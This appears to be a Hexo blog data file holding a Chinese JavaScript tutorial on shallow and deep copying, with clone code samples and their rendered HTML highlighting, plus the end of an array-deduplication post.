class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 常规方式</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> unique = <span class=\"function\">(<span class=\"params\">arr</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = [];</span><br><span class=\"line\"></span><br><span class=\"line\">  arr.forEach(<span class=\"function\"><span class=\"params\">item</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!res.includes(item)) res.push(item);</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 利用数组自带的 api</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> unique = <span class=\"function\">(<span class=\"params\">arr</span>) =&gt;</span> arr.filter(<span class=\"function\">(<span class=\"params\">item, index, array</span>) =&gt;</span> array.indexOf(item) === index);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 使用 Set</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> unique = <span class=\"function\">(<span class=\"params\">arr</span>) =&gt;</span> [...new <span class=\"built_in\">Set</span>(arr)]</span><br></pre></td></tr></table></figure>"},{"title":"浅拷贝与深拷贝","date":"2021-03-12T07:32:28.000Z","_content":"\n# 浅拷贝与深拷贝\n\n**浅拷贝**只复制指向某个对象的指针，而不复制对象本身，新旧对象还是共享同一块内存。\n**深拷贝**会另外创造一个一模一样的对象，新对象跟原对象不共享内存，修改新对象不会改到原对象。\n\n### 浅拷贝\n\n##### **Object.assign()**\n\n`Object.assign()` 方法用于将所有可枚举属性的值从一个或多个源对象分配到目标对象。它将返回目标对象。\n\n```js\nvar obj = { \n  name: 'Jack',\n  books: [1,2,3],\n  info: {\n    address: 'china'\n  }\n};\n\nvar cloneObj = Object.assign({}, obj);\n```\n\n##### `...` 扩展运算符\n\n```js\nvar obj = { \n  name: 'Jack',\n  books: [1,2,3],\n  info: {\n    address: 'china'\n  }\n};\n\nvar cloneObj = { ...obj };\n```\n\n##### `Array.prototype.concat()`\n\n`Array.prototype.concat()` 用于合并两个或多个数组，并返回一个新的数组。为非变异方法，不会修改原数组。\n\n```js\nvar arr = [1, 2, [3, 4], 5];\nvar cloneArr = arr.concat();\n```\n\n\n##### `Array.prototype.slice()`\n\n`Array.prototype.slice()` 方法返回一个新的数组对象，这一对象是一个由 `begin` 和 `end` 决定的原数组的浅拷贝（包括 `begin`，不包括 `end`）。原始数组不会被改变。\n\n```js\nvar arr = [1, 2, [3, 4], 5];\nvar cloneArr = arr.slice();\n```\n\n### 深拷贝\n\n**功能要点：**\n* 通用遍历\n* 类型判断\n* 递归调用\n* 拷贝函数\n* 循环引用\n\n> JSON.stringfy()、JSON.parse()，无法处理函数（变为空对象）和正则（变为 null）\n  \n```js\nfunction deepClone(obj, hash = new WeakMap()) {\n  if (obj === null) return obj; // 如果是null或者undefined我就不进行拷贝操作\n  if (obj instanceof Date) return new Date(obj);\n  if (obj instanceof RegExp) return new RegExp(obj);\n  // 可能是对象或者普通的值  如果是函数的话是不需要深拷贝\n  if (typeof obj !== \"object\") return obj;\n  // 是对象的话就要进行深拷贝\n  if (hash.get(obj)) return hash.get(obj);\n  let cloneObj = new obj.constructor();\n  // 找到的是所属类原型上的constructor,而原型上的 constructor指向的是当前类本身\n  hash.set(obj, cloneObj);\n  for (let key in obj) {\n    if (obj.hasOwnProperty(key)) {\n      // 实现一个递归拷贝\n      cloneObj[key] = deepClone(obj[key], hash);\n    }\n  }\n  return cloneObj;\n}\n```\n\n```js\n// ----- 完全版 ----\n\nconst mapTag = '[object Map]';\nconst setTag = '[object Set]';\nconst arrayTag = '[object Array]';\nconst objectTag = '[object Object]';\nconst argsTag = '[object Arguments]';\n\nconst boolTag = '[object Boolean]';\nconst dateTag = '[object Date]';\nconst numberTag = '[object Number]';\nconst stringTag = '[object String]';\nconst symbolTag = '[object Symbol]';\nconst errorTag = '[object Error]';\nconst regexpTag = '[object RegExp]';\nconst funcTag = '[object Function]';\n\nconst deepTag = [mapTag, setTag, arrayTag, objectTag, argsTag];\n\n\nfunction forEach(array, iteratee) {\n    let index = -1;\n    const length = array.length;\n    while (++index < length) {\n        iteratee(array[index], index);\n    }\n    return array;\n}\n\nfunction isObject(target) {\n    const type = typeof target;\n    return target !== null && (type === 'object' || type === 'function');\n}\n\nfunction getType(target) {\n    return Object.prototype.toString.call(target);\n}\n\nfunction getInit(target) {\n    const Ctor = target.constructor;\n    return new Ctor();\n}\n\nfunction cloneSymbol(targe) {\n    return Object(Symbol.prototype.valueOf.call(targe));\n}\n\nfunction cloneReg(targe) {\n    const reFlags = /\\w*$/;\n    const result = new targe.constructor(targe.source, reFlags.exec(targe));\n    result.lastIndex = targe.lastIndex;\n    return result;\n}\n\nfunction cloneFunction(func) {\n    const bodyReg = /(?<={)(.|\\n)+(?=})/m;\n    const paramReg = /(?<=\\().+(?=\\)\\s+{)/;\n    const funcString = func.toString();\n    if (func.prototype) {\n        const param = paramReg.exec(funcString);\n        const body = bodyReg.exec(funcString);\n        if (body) {\n            if (param) {\n                const paramArr = param[0].split(',');\n                return new Function(...paramArr, body[0]);\n            } else {\n                return new Function(body[0]);\n            }\n        } else {\n            return null;\n        }\n    } else {\n        return eval(funcString);\n    }\n}\n\nfunction cloneOtherType(targe, type) {\n    const Ctor = targe.constructor;\n    switch (type) {\n        case boolTag:\n        case numberTag:\n        case stringTag:\n        case errorTag:\n        case dateTag:\n            return new Ctor(targe);\n        case regexpTag:\n            return cloneReg(targe);\n        case symbolTag:\n            return cloneSymbol(targe);\n        case funcTag:\n            return cloneFunction(targe);\n        default:\n            return null;\n    }\n}\n\nfunction clone(target, map = new WeakMap()) {\n\n    // 克隆原始类型\n    if (!isObject(target)) {\n        return target;\n    }\n\n    // 初始化\n    const type = getType(target);\n    let cloneTarget;\n    if (deepTag.includes(type)) {\n        cloneTarget = getInit(target, type);\n    } else {\n        return cloneOtherType(target, type);\n    }\n\n    // 防止循环引用\n    if (map.get(target)) {\n        return map.get(target);\n    }\n    map.set(target, cloneTarget);\n\n    // 克隆set\n    if (type === setTag) {\n        target.forEach(value => {\n            cloneTarget.add(clone(value, map));\n        });\n        return cloneTarget;\n    }\n\n    // 克隆map\n    if (type === mapTag) {\n        target.forEach((value, key) => {\n            cloneTarget.set(key, clone(value, map));\n        });\n        return cloneTarget;\n    }\n\n    // 克隆对象和数组\n    const keys = type === arrayTag ? undefined : Object.keys(target);\n    forEach(keys || target, (value, key) => {\n        if (keys) {\n            key = value;\n        }\n        cloneTarget[key] = clone(target[key], map);\n    });\n\n    return cloneTarget;\n}\n\nmodule.exports = {\n    clone\n};\n```","source":"_posts/JavaScript 编程题/浅拷贝与深拷贝.md","raw":"---\ntitle: 浅拷贝与深拷贝\ncategories: JavaScript 编程题\ntags: [编程题]\ndate: 2021-03-12 15:32:28\n---\n\n# 浅拷贝与深拷贝\n\n**浅拷贝**只复制指向某个对象的指针，而不复制对象本身，新旧对象还是共享同一块内存。\n**深拷贝**会另外创造一个一模一样的对象，新对象跟原对象不共享内存，修改新对象不会改到原对象。\n\n### 浅拷贝\n\n##### **Object.assign()**\n\n`Object.assign()` 方法用于将所有可枚举属性的值从一个或多个源对象分配到目标对象。它将返回目标对象。\n\n```js\nvar obj = { \n  name: 'Jack',\n  books: [1,2,3],\n  info: {\n    address: 'china'\n  }\n};\n\nvar cloneObj = Object.assign({}, obj);\n```\n\n##### `...` 扩展运算符\n\n```js\nvar obj = { \n  name: 'Jack',\n  books: [1,2,3],\n  info: {\n    address: 'china'\n  }\n};\n\nvar cloneObj = { ...obj };\n```\n\n##### `Array.prototype.concat()`\n\n`Array.prototype.concat()` 用于合并两个或多个数组，并返回一个新的数组。为非变异方法，不会修改原数组。\n\n```js\nvar arr = [1, 2, [3, 4], 5];\nvar cloneArr = arr.concat();\n```\n\n\n##### `Array.prototype.slice()`\n\n`Array.prototype.slice()` 方法返回一个新的数组对象，这一对象是一个由 `begin` 和 `end` 决定的原数组的浅拷贝（包括 `begin`，不包括 `end`）。原始数组不会被改变。\n\n```js\nvar arr = [1, 2, [3, 4], 5];\nvar cloneArr = arr.slice();\n```\n\n### 深拷贝\n\n**功能要点：**\n* 通用遍历\n* 类型判断\n* 递归调用\n* 拷贝函数\n* 循环引用\n\n> JSON.stringfy()、JSON.parse()，无法处理函数（变为空对象）和正则（变为 null）\n  \n```js\nfunction deepClone(obj, hash = new WeakMap()) {\n  if (obj === null) return obj; // 如果是null或者undefined我就不进行拷贝操作\n  if (obj instanceof Date) return new Date(obj);\n  if (obj instanceof RegExp) return new RegExp(obj);\n  // 可能是对象或者普通的值  如果是函数的话是不需要深拷贝\n  if (typeof obj !== \"object\") return obj;\n  // 是对象的话就要进行深拷贝\n  if (hash.get(obj)) return hash.get(obj);\n  let cloneObj = new obj.constructor();\n  // 找到的是所属类原型上的constructor,而原型上的 constructor指向的是当前类本身\n  hash.set(obj, cloneObj);\n  for (let key in obj) {\n    if (obj.hasOwnProperty(key)) {\n      // 实现一个递归拷贝\n      cloneObj[key] = deepClone(obj[key], hash);\n    }\n  }\n  return cloneObj;\n}\n```\n\n```js\n// ----- 完全版 ----\n\nconst mapTag = '[object Map]';\nconst setTag = '[object Set]';\nconst arrayTag = '[object Array]';\nconst objectTag = '[object Object]';\nconst argsTag = '[object Arguments]';\n\nconst boolTag = '[object Boolean]';\nconst dateTag = '[object Date]';\nconst numberTag = '[object Number]';\nconst stringTag = '[object String]';\nconst symbolTag = '[object Symbol]';\nconst errorTag = '[object Error]';\nconst regexpTag = '[object RegExp]';\nconst funcTag = '[object Function]';\n\nconst deepTag = [mapTag, setTag, arrayTag, objectTag, argsTag];\n\n\nfunction forEach(array, iteratee) {\n    let index = -1;\n    const length = array.length;\n    while (++index < length) {\n        iteratee(array[index], index);\n    }\n    return array;\n}\n\nfunction isObject(target) {\n    const type = typeof target;\n    return target !== null && (type === 'object' || type === 'function');\n}\n\nfunction getType(target) {\n    return Object.prototype.toString.call(target);\n}\n\nfunction getInit(target) {\n    const Ctor = target.constructor;\n    return new Ctor();\n}\n\nfunction cloneSymbol(targe) {\n    return Object(Symbol.prototype.valueOf.call(targe));\n}\n\nfunction cloneReg(targe) {\n    const reFlags = /\\w*$/;\n    const result = new targe.constructor(targe.source, reFlags.exec(targe));\n    result.lastIndex = targe.lastIndex;\n    return result;\n}\n\nfunction cloneFunction(func) {\n    const bodyReg = /(?<={)(.|\\n)+(?=})/m;\n    const paramReg = /(?<=\\().+(?=\\)\\s+{)/;\n    const funcString = func.toString();\n    if (func.prototype) {\n        const param = paramReg.exec(funcString);\n        const body = bodyReg.exec(funcString);\n        if (body) {\n            if (param) {\n                const paramArr = param[0].split(',');\n                return new Function(...paramArr, body[0]);\n            } else {\n                return new Function(body[0]);\n            }\n        } else {\n            return null;\n        }\n    } else {\n        return eval(funcString);\n    }\n}\n\nfunction cloneOtherType(targe, type) {\n    const Ctor = targe.constructor;\n    switch (type) {\n        case boolTag:\n        case numberTag:\n        case stringTag:\n        case errorTag:\n        case dateTag:\n            return new Ctor(targe);\n        case regexpTag:\n            return cloneReg(targe);\n        case symbolTag:\n            return cloneSymbol(targe);\n        case funcTag:\n            return cloneFunction(targe);\n        default:\n            return null;\n    }\n}\n\nfunction clone(target, map = new WeakMap()) {\n\n    // 克隆原始类型\n    if (!isObject(target)) {\n        return target;\n    }\n\n    // 初始化\n    const type = getType(target);\n    let cloneTarget;\n    if (deepTag.includes(type)) {\n        cloneTarget = getInit(target, type);\n    } else {\n        return cloneOtherType(target, type);\n    }\n\n    // 防止循环引用\n    if (map.get(target)) {\n        return map.get(target);\n    }\n    map.set(target, cloneTarget);\n\n    // 克隆set\n    if (type === setTag) {\n        target.forEach(value => {\n            cloneTarget.add(clone(value, map));\n        });\n        return cloneTarget;\n    }\n\n    // 克隆map\n    if (type === mapTag) {\n        target.forEach((value, key) => {\n            cloneTarget.set(key, clone(value, map));\n        });\n        return cloneTarget;\n    }\n\n    // 克隆对象和数组\n    const keys = type === arrayTag ? undefined : Object.keys(target);\n    forEach(keys || target, (value, key) => {\n        if (keys) {\n            key = value;\n        }\n        cloneTarget[key] = clone(target[key], map);\n    });\n\n    return cloneTarget;\n}\n\nmodule.exports = {\n    clone\n};\n```","slug":"JavaScript 编程题/浅拷贝与深拷贝","published":1,"updated":"2021-05-31T08:23:33.965Z","_id":"ckpccb4el0001hq6r7z0t88rf","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"浅拷贝与深拷贝\"><a href=\"#浅拷贝与深拷贝\" class=\"headerlink\" title=\"浅拷贝与深拷贝\"></a>浅拷贝与深拷贝</h1><p><strong>浅拷贝</strong>只复制指向某个对象的指针，而不复制对象本身，新旧对象还是共享同一块内存。<br><strong>深拷贝</strong>会另外创造一个一模一样的对象，新对象跟原对象不共享内存，修改新对象不会改到原对象。</p>\n<h3 id=\"浅拷贝\"><a href=\"#浅拷贝\" class=\"headerlink\" title=\"浅拷贝\"></a>浅拷贝</h3><h5 id=\"Object-assign\"><a href=\"#Object-assign\" class=\"headerlink\" title=\"Object.assign()\"></a><strong>Object.assign()</strong></h5><p><code>Object.assign()</code> 方法用于将所有可枚举属性的值从一个或多个源对象分配到目标对象。它将返回目标对象。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123; </span><br><span class=\"line\">  name: <span class=\"string\">&#x27;Jack&#x27;</span>,</span><br><span class=\"line\">  books: [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>],</span><br><span class=\"line\">  info: &#123;</span><br><span class=\"line\">    address: <span class=\"string\">&#x27;china&#x27;</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> cloneObj = <span class=\"built_in\">Object</span>.assign(&#123;&#125;, obj);</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"扩展运算符\"><a href=\"#扩展运算符\" class=\"headerlink\" title=\"... 扩展运算符\"></a><code>...</code> 扩展运算符</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123; </span><br><span class=\"line\">  name: <span class=\"string\">&#x27;Jack&#x27;</span>,</span><br><span class=\"line\">  books: [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>],</span><br><span class=\"line\">  info: &#123;</span><br><span class=\"line\">    address: <span class=\"string\">&#x27;china&#x27;</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> cloneObj = &#123; ...obj &#125;;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"Array-prototype-concat\"><a href=\"#Array-prototype-concat\" class=\"headerlink\" title=\"Array.prototype.concat()\"></a><code>Array.prototype.concat()</code></h5><p><code>Array.prototype.concat()</code> 用于合并两个或多个数组，并返回一个新的数组。为非变异方法，不会修改原数组。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, [<span class=\"number\">3</span>, <span class=\"number\">4</span>], <span class=\"number\">5</span>];</span><br><span class=\"line\"><span class=\"keyword\">var</span> cloneArr = arr.concat();</span><br></pre></td></tr></table></figure>\n\n\n<h5 id=\"Array-prototype-slice\"><a href=\"#Array-prototype-slice\" class=\"headerlink\" title=\"Array.prototype.slice()\"></a><code>Array.prototype.slice()</code></h5><p><code>Array.prototype.slice()</code> 方法返回一个新的数组对象，这一对象是一个由 <code>begin</code> 和 <code>end</code> 决定的原数组的浅拷贝（包括 <code>begin</code>，不包括 <code>end</code>）。原始数组不会被改变。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, [<span class=\"number\">3</span>, <span class=\"number\">4</span>], <span class=\"number\">5</span>];</span><br><span class=\"line\"><span class=\"keyword\">var</span> cloneArr = arr.slice();</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"深拷贝\"><a href=\"#深拷贝\" class=\"headerlink\" title=\"深拷贝\"></a>深拷贝</h3><p><strong>功能要点：</strong></p>\n<ul>\n<li>通用遍历</li>\n<li>类型判断</li>\n<li>递归调用</li>\n<li>拷贝函数</li>\n<li>循环引用</li>\n</ul>\n<blockquote>\n<p>JSON.stringfy()、JSON.parse()，无法处理函数（变为空对象）和正则（变为 null）</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">deepClone</span>(<span class=\"params\">obj, hash = <span class=\"keyword\">new</span> <span class=\"built_in\">WeakMap</span>()</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (obj === <span class=\"literal\">null</span>) <span class=\"keyword\">return</span> obj; <span class=\"comment\">// 如果是null或者undefined我就不进行拷贝操作</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (obj <span class=\"keyword\">instanceof</span> <span class=\"built_in\">Date</span>) <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>(obj);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (obj <span class=\"keyword\">instanceof</span> <span class=\"built_in\">RegExp</span>) <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">RegExp</span>(obj);</span><br><span class=\"line\">  <span class=\"comment\">// 可能是对象或者普通的值  如果是函数的话是不需要深拷贝</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> obj !== <span class=\"string\">&quot;object&quot;</span>) <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\">  <span class=\"comment\">// 是对象的话就要进行深拷贝</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (hash.get(obj)) <span class=\"keyword\">return</span> hash.get(obj);</span><br><span class=\"line\">  <span class=\"keyword\">let</span> cloneObj = <span class=\"keyword\">new</span> obj.constructor();</span><br><span class=\"line\">  <span class=\"comment\">// 找到的是所属类原型上的constructor,而原型上的 constructor指向的是当前类本身</span></span><br><span class=\"line\">  hash.set(obj, cloneObj);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> key <span class=\"keyword\">in</span> obj) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (obj.hasOwnProperty(key)) &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 实现一个递归拷贝</span></span><br><span class=\"line\">      cloneObj[key] = deepClone(obj[key], hash);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> cloneObj;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// ----- 完全版 ----</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> mapTag = <span class=\"string\">&#x27;[object Map]&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> setTag = <span class=\"string\">&#x27;[object Set]&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> arrayTag = <span class=\"string\">&#x27;[object Array]&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> objectTag = <span class=\"string\">&#x27;[object Object]&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> argsTag = <span class=\"string\">&#x27;[object Arguments]&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> boolTag = <span class=\"string\">&#x27;[object Boolean]&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> dateTag = <span class=\"string\">&#x27;[object Date]&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> numberTag = <span class=\"string\">&#x27;[object Number]&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> stringTag = <span class=\"string\">&#x27;[object String]&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> symbolTag = <span class=\"string\">&#x27;[object Symbol]&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> errorTag = <span class=\"string\">&#x27;[object Error]&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> regexpTag = <span class=\"string\">&#x27;[object RegExp]&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> funcTag = <span class=\"string\">&#x27;[object Function]&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> deepTag = [mapTag, setTag, arrayTag, objectTag, argsTag];</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">forEach</span>(<span class=\"params\">array, iteratee</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> index = -<span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> length = array.length;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (++index &lt; length) &#123;</span><br><span class=\"line\">        iteratee(array[index], index);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> array;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isObject</span>(<span class=\"params\">target</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> type = <span class=\"keyword\">typeof</span> target;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> target !== <span class=\"literal\">null</span> &amp;&amp; (type === <span class=\"string\">&#x27;object&#x27;</span> || type === <span class=\"string\">&#x27;function&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getType</span>(<span class=\"params\">target</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">Object</span>.prototype.toString.call(target);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getInit</span>(<span class=\"params\">target</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> Ctor = target.constructor;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> Ctor();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">cloneSymbol</span>(<span class=\"params\">targe</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">Object</span>(<span class=\"built_in\">Symbol</span>.prototype.valueOf.call(targe));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">cloneReg</span>(<span class=\"params\">targe</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> reFlags = <span class=\"regexp\">/\\w*$/</span>;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> result = <span class=\"keyword\">new</span> targe.constructor(targe.source, reFlags.exec(targe));</span><br><span class=\"line\">    